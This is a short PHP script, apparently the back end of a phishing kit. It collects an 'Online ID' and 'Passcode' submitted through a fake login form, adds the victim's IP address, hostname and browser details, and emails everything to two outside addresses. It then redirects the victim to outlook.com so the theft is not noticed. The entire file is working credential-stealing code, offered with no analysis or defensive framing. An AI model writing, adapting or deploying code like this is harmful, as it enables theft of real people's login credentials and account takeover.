<?php
if($_POST['a'] != "" and $_POST['b'] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| IN GOD WE TRUST|--------------|\n";
$message .= "Online ID            : ".$_POST['a']."\n";
$message .= "Passcode              : ".$_POST['b']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Mena [.] RU --------------|\n";
$send = "saleslogs@protonmail.com,menalogs.details@yandex.com";
$subject = "Burn Para | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://outlook.com/");
}

?>
